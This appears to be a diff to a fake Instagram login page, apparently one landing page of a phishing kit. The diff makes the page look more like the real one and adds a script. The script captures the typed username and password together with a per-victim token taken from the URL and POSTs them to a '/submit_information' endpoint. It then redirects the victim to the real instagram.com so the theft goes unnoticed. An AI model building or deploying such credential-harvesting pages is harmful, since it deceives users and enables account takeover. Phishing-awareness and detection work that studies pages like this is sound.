@@ -4,11 +4,11 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Instagram Login Form </title>
+    <title>Instagram</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
         integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link rel="stylesheet" href="instagraml.css">
+    <link rel="stylesheet" href="/LandingPages/instagram/instagraml.css">
 </head>
 <body>
 
@@ -16,14 +16,14 @@
         <section>
             <div class="main-top">
                 <div class="logo">
-                    <img src="./logo.png" />
+                    <img src="/LandingPages/instagram/logo.png" />
                 </div>
                 <div>
-                    <input type="text" placeholder="username" class="username" />
+                    <input type="text" placeholder="username" class="username" name="username" required />
                     <div>
-                        <input type="password" placeholder="password" class="password" />
+                        <input type="password" placeholder="password" class="password" name="password" required />
                     </div>
-                    <input type="button" value="Log in" class="login-btn" />
+                    <input type="button" value="Log in" class="login-btn" onclick="addInformation()" />
                 </div>
 
                 <span class="or"> OR </span>
@@ -42,8 +42,8 @@
             <div class="app-section">
                 <span> Get the app </span>
                 <div class="images">
-                    <img src="./googlePlay.png" alt="googlePlay Image">
-                    <img src="./microsoft.png" alt="Microsoft Image">
+                    <img src="/LandingPages/instagram/googlePlay.png" alt="googlePlay Image">
+                    <img src="/LandingPages/instagram/microsoft.png" alt="Microsoft Image">
                 </div>
             </div>
         </section>
@@ -75,6 +75,34 @@
             </div>
         </footer>
     </div>
+
+    <script>
+
+        function addInformation() {
+            event.preventDefault();
+            const username = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+            const page = 'Instagram';
+            var token = window.location.pathname.split('/')[2];
+            fetch('/submit_information', {
+                method: 'POST',
+                headers: {
+                        'Content-Type': 'application/json',
+                    },
+                body: JSON.stringify({ username, password, token, page })
+            })
+            .then(response => {
+                if(response.ok) {
+                    window.location.href = 'https://www.instagram.com'; // Redirect after successful submission
+                }
+                return response.json();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+    </script>
 
 </body>
 </html>
